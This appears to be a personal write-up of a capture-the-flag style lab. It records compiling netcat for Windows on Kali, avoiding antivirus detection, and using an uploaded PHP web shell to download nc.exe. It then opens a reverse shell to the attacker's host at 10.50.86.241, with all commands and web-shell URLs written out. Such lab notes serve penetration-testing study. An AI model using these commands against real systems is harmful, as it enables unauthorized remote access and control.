
Now we have a shell payload which for the time being is not detected by the AV so will compile it using netcat and reverse shell

We have serveral options:
- PowerShell but it may get detected
- PHP reverse shell it may also get picked up
- Msfvenom may generate a distinctive we could use [Veil Framework](https://www.veil-framework.com/) or Shelter
- Uploading netcat is the quickest and easy option.


What is cross-compilation techniques ?_?
The idea is to compile source code into a working program to run on a different platform.
It's an cross compilation skill although in many ways it's preferable to avoid it.

Always try to compile code into an environment as close to the target environment as possible.
Cross-compile x64 windows programs on kali using the mingw-64 package.

It's a big package but just like gcc used to compile binaries on Linux, we can use the mingw compilers to compile windows binaries.

Will run make to build the binary the correct compiler will be used to generate a x64 windows
executable. Note there will be a lot of warnings generated by the compiler.

We have to download the nc.exe from the github and compile it on kali linux.
https://github.com/int0x33/nc.exe/
```
CC=x86_64-w64-mingw32-gcc
```

MakeFile:
![[Pasted image 20240114204304.png]]


Package:
```
sudo apt install mingw-w64
```

![[Pasted image 20240114204927.png]]

Note we have to remove or mv the already compiled binary in order for this to get working.


```
http://10.200.85.100/resources/uploads/shell-sardarji.jpeg.php?wreath=certutil.exe
```
![[Pasted image 20240120233910.png]]
![[Pasted image 20240114230338.png]]

Cert-util is a default Windows tool that is used to (amongst other things) download CA certificates. This also makes it ideal for file transfers, _but_ Defender flags this as malicious.

```
python3 -m http.server 80
```

As the curl command returned nothing when we were running it on the command line but
```
curl http://10.50.86.241/nc.exe -o c:\\windows\\temp\\nc-sardarji.exe
```
![[Pasted image 20240114231420.png]]

Now we have everything we want for a reverse shell
So will set up a listner and we are good to go
```
nc -lvnp 4242
```

```
powershell.exe c:\\windows\\temp\\nc-sardarji.exe 10.50.86.241 4242 -e cmd.exe
```

The site got hung which means we got a shell
![[Pasted image 20240114231903.png]]

_**Note:** In order for this to work we had to wrap the netcat command inside a powershell process to keep it from exiting early._

```
http://10.200.85.100/resources/uploads/shell-sardarji.jpeg.php?wreath=powershell.exe%20c:\\windows\\temp\\nc-sardarji.exe%2010.50.86.241%204242%20-e%20cmd.exe
```
